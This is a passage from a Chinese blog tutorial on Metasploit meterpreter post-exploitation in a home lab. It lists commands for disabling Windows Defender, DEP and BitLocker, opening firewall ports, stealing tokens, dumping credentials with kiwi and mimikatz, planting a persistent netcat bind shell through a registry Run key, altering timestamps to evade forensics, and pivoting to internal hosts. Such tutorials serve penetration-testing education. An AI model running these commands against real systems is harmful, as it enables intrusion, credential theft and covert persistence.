+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; execute -f cmd -i -H	</span><br><span class="line">C:\windows\system32&gt;netsh firewall show opmode</span><br><span class="line">C:\windows\system32&gt;netsh firewall add portopening TCP 444 &quot;hia-hia-hia&quot; ENABLE ALL</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="关闭windefend"><a href="#关闭windefend" class="headerlink" title="关闭windefend"></a>关闭windefend</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net stop windefend（就像很普通的关闭服务）</span><br></pre></td></tr></table></figure>
+
+<h3 id="关闭bitlocker"><a href="#关闭bitlocker" class="headerlink" title="关闭bitlocker"></a>关闭bitlocker</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">manage-bde -status E: </span><br><span class="line">manage-bde -off E:（需要在受害者已经解锁后才能去除加密，如下图）</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571992266102/0" alt=""><br><img src="https://blog.betamao.me/image/2017-09-01-09-00-55.png" alt="img"></p>
+<p><img src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571992323617/0" alt=""></p>
+<h3 id="开启远程桌面"><a href="#开启远程桌面" class="headerlink" title="开启远程桌面"></a>开启远程桌面</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure>
+
+<p>（看到最后一句提供了关闭的rc文件）<br><img src="https://puui.qpic.cn/fans_admin/0/3_1452561028_1571993706465/0" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run getgui -e run </span><br><span class="line">getgui -u username -p passwd</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571992397329/0" alt=""></p>
+<h3 id="关闭DEP"><a href="#关闭DEP" class="headerlink" title="关闭DEP"></a>关闭DEP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bcdedit.exe /set &#123;current&#125; nx AlwaysOff</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571992447186/0" alt=""></p>
+<h3 id="杀死防病毒软件"><a href="#杀死防病毒软件" class="headerlink" title="杀死防病毒软件"></a>杀死防病毒软件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run killav			(已经失效)</span><br></pre></td></tr></table></figure>
+
+<h3 id="token窃取"><a href="#token窃取" class="headerlink" title="token窃取"></a>token窃取</h3><p>tokens：<br>用户每次登陆，账号绑定临时的token<br>访问资源时提交token进行身份验证，类似于web cookie</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">delegate token:交互登陆会话</span><br><span class="line">impersonate token：非交互登陆会话（他们两者权限是一样的，但是只有delegate token可以交互）</span><br><span class="line">delegate token账号注销后变为impersonate token，权限依然有效</span><br></pre></td></tr></table></figure>
+
+<h3 id="incognito"><a href="#incognito" class="headerlink" title="incognito"></a>incognito</h3><p>独立功能的软件，被msf集成在meterpreter中<br>无需密码破解或获取密码hash，窃取token将自己伪装成其他用户<br>尤其适用于与环境下提权渗透多操作系统，下面的模块中含有相关技术<br>其他模块<br>使用load可以看到存在插件<br><img src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571992486295/0" alt=""></p>
+<h3 id="espia"><a href="#espia" class="headerlink" title="espia"></a>espia</h3><p>screengrab用来截屏。。。</p>
+<h3 id="lanattacks"><a href="#lanattacks" class="headerlink" title="lanattacks"></a>lanattacks</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Lanattacks: DHCP Commands</span><br><span class="line">=========================</span><br><span class="line">    dhcp_load_options  载入选项</span><br><span class="line">    dhcp_log           记录</span><br><span class="line">    dhcp_reset         重置</span><br><span class="line">    dhcp_set_option    设置</span><br><span class="line">    dhcp_start         开始</span><br><span class="line">    dhcp_stop          停止</span><br><span class="line">Lanattacks: TFTP Commands</span><br><span class="line">=========================</span><br><span class="line">    tftp_add_file  像tftp添加文件</span><br><span class="line">    tftp_reset     重置</span><br><span class="line">    tftp_start     开始</span><br><span class="line">tftp_stop      停止</span><br></pre></td></tr></table></figure>
+
+<h3 id="extapi"><a href="#extapi" class="headerlink" title="extapi"></a>extapi</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Extapi: Window Management Commands</span><br><span class="line">==================================</span><br><span class="line">    window_enum   枚举所有已经打开的窗口</span><br><span class="line">Extapi: Service Management Commands</span><br><span class="line">===================================</span><br><span class="line">    service_control  控制服务 (start/pause/resume/stop/restart)</span><br><span class="line">    service_enum    枚举所有服务</span><br><span class="line">    service_query    查询指定服务细节</span><br><span class="line">Extapi: Clipboard Management Commands</span><br><span class="line">=====================================</span><br><span class="line">    clipboard_get_data       	读取剪贴板内容</span><br><span class="line">    clipboard_monitor_dump   下载监听的内容</span><br><span class="line">    clipboard_monitor_pause   暂停监听</span><br><span class="line">    clipboard_monitor_purge   删除已经监听的数据</span><br><span class="line">    clipboard_monitor_resume  继续监听</span><br><span class="line">    clipboard_monitor_start   监听剪贴板</span><br><span class="line">    clipboard_monitor_stop    停止监听</span><br><span class="line">    clipboard_set_text        向目标剪贴板写入文本（似乎并不好用）</span><br><span class="line">Extapi: ADSI Management Commands</span><br><span class="line">================================</span><br><span class="line">    adsi_computer_enum           枚举所有指定域的电脑</span><br><span class="line">    adsi_dc_enum                枚举所有指定域的域控制器</span><br><span class="line">    adsi_domain_query            Enumerate all objects on the specified domain that match a filter.</span><br><span class="line">    adsi_group_enum              枚举所有指定域的组</span><br><span class="line">    adsi_nested_group_user_enum  Recursively enumerate users who are effectively members of the group specified.</span><br><span class="line">    adsi_user_enum               枚举所有指定域的用户</span><br><span class="line">Extapi: WMI Querying Commands</span><br><span class="line">=============================</span><br><span class="line">wmi_query     Perform a generic WMI query and return the results</span><br></pre></td></tr></table></figure>
+
+<h3 id="kiwi"><a href="#kiwi" class="headerlink" title="kiwi"></a>kiwi</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Kiwi Commands</span><br><span class="line">=============</span><br><span class="line">    creds_all              Retrieve all credentials         #实在不行还可以用模块钓鱼获取</span><br><span class="line">    creds_kerberos         Retrieve Kerberos creds</span><br><span class="line">    creds_livessp          Retrieve LiveSSP creds</span><br><span class="line">    creds_msv              Retrieve LM/NTLM creds (hashes)</span><br><span class="line">    creds_ssp              Retrieve SSP creds</span><br><span class="line">    creds_tspkg            Retrieve TsPkg creds</span><br><span class="line">    creds_wdigest          Retrieve WDigest creds</span><br><span class="line">    golden_ticket_create   Create a golden kerberos ticket</span><br><span class="line">    kerberos_ticket_list   List all kerberos tickets</span><br><span class="line">    kerberos_ticket_purge  Purge any in-use kerberos tickets</span><br><span class="line">    kerberos_ticket_use    Use a kerberos ticket</span><br><span class="line">    lsa_dump             下载LSA secrets</span><br><span class="line">    wifi_list              列出WiFi密码</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571992515584/0" alt=""></p>
+<h3 id="Incognito"><a href="#Incognito" class="headerlink" title="Incognito"></a>Incognito</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Incognito Commands</span><br><span class="line">==================</span><br><span class="line">    add_group_user       尝试用所有的token去添加一个用户到域</span><br><span class="line">    add_localgroup_user  尝试用所有的token去添加一个用户到本地</span><br><span class="line">    add_user            尝试用所有token去添加一个用户</span><br><span class="line">    impersonate_token    使用Impersonate token伪装身份</span><br><span class="line">    list_tokens           列出存在的token</span><br><span class="line">    snarf_hashes         Snarf challenge/response hashes for every token</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571992544776/0" alt=""><br><img src="https://blog.betamao.me/image/2017-09-01-09-06-16.png" alt="img"></p>
+<p><img src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571992599192/0" alt=""></p>
+<h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Mimikatz Commands</span><br><span class="line">    kerberos          Attempt to retrieve kerberos creds</span><br><span class="line">    livessp           Attempt to retrieve livessp creds</span><br><span class="line">    mimikatz_command  Run a custom command</span><br><span class="line">    msv               Attempt to retrieve msv creds (hashes)</span><br><span class="line">    ssp               Attempt to retrieve ssp creds</span><br><span class="line">    tspkg             Attempt to retrieve tspkg creds</span><br><span class="line">    wdigest           Attempt to retrieve wdigest creds</span><br></pre></td></tr></table></figure>
+
+<h3 id="sniffer"><a href="#sniffer" class="headerlink" title="sniffer"></a>sniffer</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Sniffer Commands</span><br><span class="line">    sniffer_dump      下载捕获的包</span><br><span class="line">    sniffer_interfaces   枚举所有可用网络接口</span><br><span class="line">    sniffer_release     释放捕获的包</span><br><span class="line">    sniffer_start       开始</span><br><span class="line">    sniffer_stats       状态</span><br><span class="line">    sniffer_stop        停止捕获包</span><br></pre></td></tr></table></figure>
+
+<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Python Commands</span><br><span class="line">===============</span><br><span class="line">    python_execute  执行一串Python命令</span><br><span class="line">    python_import   导入运行脚本或模块</span><br><span class="line">    python_reset    重启解释器</span><br></pre></td></tr></table></figure>
+
+<h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Powershell Commands</span><br><span class="line">===================</span><br><span class="line">    powershell_execute  执行一串powershell命令</span><br><span class="line">    powershell_import   导入ps1文件或是 .NET 组装的 DLL</span><br><span class="line">    powershell_shell    进入交互式powershell</span><br></pre></td></tr></table></figure>
+
+<h3 id="REG"><a href="#REG" class="headerlink" title="REG"></a>REG</h3><p>使用注册表编辑器：<br>Windows几乎所有的设置都是写在注册表中的，所以注册表工具异常强大，这里以安装一个开机自启动执行监听并返回shell的nc为例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">reg </span><br><span class="line">Usage: reg [command] [options]</span><br><span class="line">OPTIONS:</span><br><span class="line">    -d &lt;opt&gt;  设置键值.</span><br><span class="line">    -k &lt;opt&gt;  指定键路径(E.g. HKLM\Software\Foo).</span><br><span class="line">    -r &lt;opt&gt;  The remote machine name to connect to (with current process credentials</span><br><span class="line">    -t &lt;opt&gt;  设置键类型(E.g. REG_SZ).</span><br><span class="line">    -v &lt;opt&gt;  设置键名</span><br><span class="line">    -w        Set KEY_WOW64 flag, valid values [32|64].</span><br><span class="line">COMMANDS:</span><br><span class="line">    enumkey		枚举一个键的值 [-k &lt;key&gt;]</span><br><span class="line">    createkey	创建一个键  [-k &lt;key&gt;]</span><br><span class="line">    deletekey	删除一个键  [-k &lt;key&gt;]</span><br><span class="line">    queryclass 	查询键的class [-k &lt;key&gt;]</span><br><span class="line">    setval		设置一个子键 [-k &lt;key&gt; -v &lt;val&gt; -d &lt;data&gt;]</span><br><span class="line">    deleteval	删除一个子键 [-k &lt;key&gt; -v &lt;val&gt;]</span><br><span class="line">queryval	查询一个子键 [-k &lt;key&gt; -v &lt;val&gt;]</span><br></pre></td></tr></table></figure>
+
+
+
+<p>补充：nc.exe：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">connect to somewhere:   nc [-options] hostname port[s] [ports] ...</span><br><span class="line">listen for inbound:     nc -l -p port [options] [hostname] [port]</span><br><span class="line">options:</span><br><span class="line">        -d              从控制台分离后悄悄执行</span><br><span class="line">        -e prog         绑定一个程序到监听端口[dangerous!!]</span><br><span class="line">        -i secs         间隔时间</span><br><span class="line">        -l              监听模式</span><br><span class="line">        -L              监听且在连接断开后，继续监听</span><br><span class="line">        -n              numeric-only IP addresses, no DNS</span><br><span class="line">        -o file         以16进制下载数据</span><br><span class="line">        -p port         本地端口号</span><br><span class="line">        -r              使用随机的本地/远程端口</span><br><span class="line">        -s addr         源地址</span><br><span class="line">        -t              回应Telnet协商</span><br><span class="line">        -u              UDP模式</span><br><span class="line">        -v              详细信息</span><br><span class="line">        -z              端口扫描</span><br><span class="line">        port numbers can be individual or ranges: m-n [inclusive]</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查询这个键：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run</span><br></pre></td></tr></table></figure>
+
+
+
+<p>设置子健：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d &apos;C:\nc.exe -Ldp 444 -e C:\\windows\system32\cmd.exe&apos;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查询子健：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571992634302/0" alt=""><br>Win7上查看下：<br><img src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571992673185/0" alt=""></p>
+<h3 id="execute"><a href="#execute" class="headerlink" title="execute"></a>execute</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Usage: execute -f file [options]</span><br><span class="line">Executes a command on the remote machine.</span><br><span class="line">OPTIONS:</span><br><span class="line">    -H        创建隐藏的进程</span><br><span class="line">    -a &lt;opt&gt;  The arguments to pass to the command.</span><br><span class="line">    -c        Channelized I/O (required for interaction).</span><br><span class="line">    -d &lt;opt&gt;  The &apos;dummy&apos; executable to launch when using -m.</span><br><span class="line">    -f &lt;opt&gt;  要执行的命令</span><br><span class="line">    -i        交互式执行</span><br><span class="line">    -k        Execute process on the meterpreters current desktop</span><br><span class="line">    -m        从内存中执行</span><br><span class="line">    -s &lt;opt&gt;  以指定session的用户身份来执行该命令</span><br><span class="line">    -t        以impersonated token身份来执行该命令</span><br><span class="line">Usage: execute -f file [options]Executes a command on the remote machine.OPTIONS:    -H        创建隐藏的进程    -a &lt;opt&gt;  The arguments to pass to the command.    -c        Channelized I/O (required for interaction).    -d &lt;opt&gt;  The &apos;dummy&apos; executable to launch when using -m.    -f &lt;opt&gt;  要执行的命令    -i        交互式执行    -k        Execute process on the meterpreters current desktop    -m        从内存中执行    -s &lt;opt&gt;  以指定session的用户身份来执行该命令    -t        以impersonated token身份来执行该命令</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://puui.qpic.cn/fans_admin/0/3_1409075683_1571992730166/0" alt=""></p>
+<p><img src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571992980934/0" alt=""></p>
+<p><img src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571992980934/0" alt=""></p>
+<p>检查成功：<br><img src="https://puui.qpic.cn/fans_admin/0/3_1452561028_1571993099265/0" alt=""></p>
+<h2 id="timestomp"><a href="#timestomp" class="headerlink" title="timestomp"></a>timestomp</h2><p>说起文件时间就是一个坑，第一次往学长靶机放shell就是因为这个被秒找到。。。<br><em>前言：</em><br>文件系统访问会留下痕迹，这是电子取证重点关注的地方，渗透测试和攻击者往往希望销毁文件系统访问痕迹，但是鬼知道有没有彻底销毁，所以最好的避免被电子取证发现的方法就是不要碰文件系统，而这也是meterpreter的先天优势所在（完全基于内存），要是碰了该咋办呢？<br><em>不搭后语：</em><br>mac时间（modified/accessed/changed）<br>可以使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls –l hia.exe</span><br><span class="line">ls -l --time=atime hia.exe</span><br><span class="line">ls –l –time=ctime hia.exe</span><br></pre></td></tr></table></figure>
+
+
+
+<p>也可以使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Stat hia.exe</span><br></pre></td></tr></table></figure>
+
+
+
+<p>也可以使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; timestomp </span><br><span class="line">Usage: timestomp OPTIONS file_path</span><br><span class="line">OPTIONS:</span><br><span class="line">    -b        删除mace时间戳</span><br><span class="line">    -a &lt;opt&gt;  设置atime</span><br><span class="line">    -c &lt;opt&gt;  设置ctime</span><br><span class="line">	-m &lt;opt&gt;  设置mtime</span><br><span class="line">    -e &lt;opt&gt;  设置etime</span><br><span class="line">    -z &lt;opt&gt;  设置所有时间</span><br><span class="line">    -f &lt;opt&gt;  复制指定文件的时间戳</span><br><span class="line">    -r        对一个目录递归设置mace时间戳</span><br><span class="line">    -v        显示mace时间戳</span><br></pre></td></tr></table></figure>
+
+
+
+<p>补充：mace中的e:mft entry<br>mft：ntfs文件系统的主文件分配表 master file table<br>通常1024字节或2个硬盘扇区，其中存放多项entry信息<br>包含文件大量信息（大小 名称 目录位置 磁盘位置 创建日期）<br>更多信息可研究文件系统取证分析技术<br>文字不够图来凑：<br><img src="https://puui.qpic.cn/fans_admin/0/3_1452561028_1571993159081/0" alt=""></p>
+<p><img src="https://puui.qpic.cn/fans_admin/0/3_1409075683_1571993190082/0" alt=""></p>
+<h3 id="跳板"><a href="#跳板" class="headerlink" title="跳板"></a>跳板</h3><p>实验环境：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Monowall 192.168.79.135/10.21.11.1    边界防火墙</span><br><span class="line">Win7 10.21.11.2        内网主机，执行木马反弹shell，用来做跳板</span><br><span class="line">Winxp    10.21.11.3    内网主机，被通过跳板攻击</span><br><span class="line">Kali2016.2 192.168.79.130            攻击</span><br></pre></td></tr></table></figure>
+
+<h4 id="使用跳板"><a href="#使用跳板" class="headerlink" title="使用跳板"></a>使用跳板</h4><p>配置防火墙规则，开心就好<br>取得win7shell，双击就好<br><img src="https://puui.qpic.cn/fans_admin/0/3_1440820217_1571993365565/0" alt=""><br>查看IP：<br><img src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571993390282/0" alt=""><br>使用跳板：<br><img src="https://puui.qpic.cn/fans_admin/0/3_1409075683_1571993503098/0" alt=""><br>扫描内网：<br><img src="https://puui.qpic.cn/fans_admin/0/3_1409075683_1571993531860/0" alt=""><br>（速度太慢了，就只指定了一台主机）<br>入侵内网主机：<br><img src="https://puui.qpic.cn/fans_admin/0/3_1452561028_1571993560615/0" alt=""><br>（恶俗的08067…）</p>
+<h4 id="使用端口转发："><a href="#使用端口转发：" class="headerlink" title="使用端口转发："></a>使用端口转发：</h4><p>命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd -h</span><br><span class="line">Usage: portfwd [-h] [add | delete | list | flush] [args]</span><br><span class="line">OPTIONS:</span><br><span class="line">    -L &lt;opt&gt;  Forward: 本地监听主机</span><br><span class="line">			  Remote: 要连接的本地主机</span><br><span class="line">    -R        表明是个反弹的端口转发</span><br><span class="line">    -l &lt;opt&gt;  Forward: 本地监听端口</span><br><span class="line">			  Reverse: 本地主机去连接的端口</span><br><span class="line">    -p &lt;opt&gt;  Forward: 要连接到的远程主机端口</span><br><span class="line">			  Reverse: 远程主机监听的端口</span><br><span class="line">    -r &lt;opt&gt;  Forward: 远程主机</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -L 192.168.79.130 -l 54321  -r 10.21.11.3 -p 445</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://puui.qpic.cn/fans_admin/0/3_2007801347_1571993586655/0" alt=""><br>后来：<br>使用跳板的路由配置只在msfconsole内部生效，似乎db_nmap无效<br>使用跳板时若跳板机防火墙规则不允许出站可以使用之前的方法修改规则<br>若本机自己处于内网，可以使用动态域名内网穿透和公网主机+隧道的方式</p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pushm</span><br><span class="line">popm        #可以把模块及其参数用栈保存</span><br></pre></td></tr></table></figure>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://hzerui.github.io" rel="external nofollow noreferrer">John Doe</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://hzerui.github.io/2019/12/17/Metasploit/">https://hzerui.github.io/2019/12/17/Metasploit/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="https://hzerui.github.io" target="_blank">John Doe</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
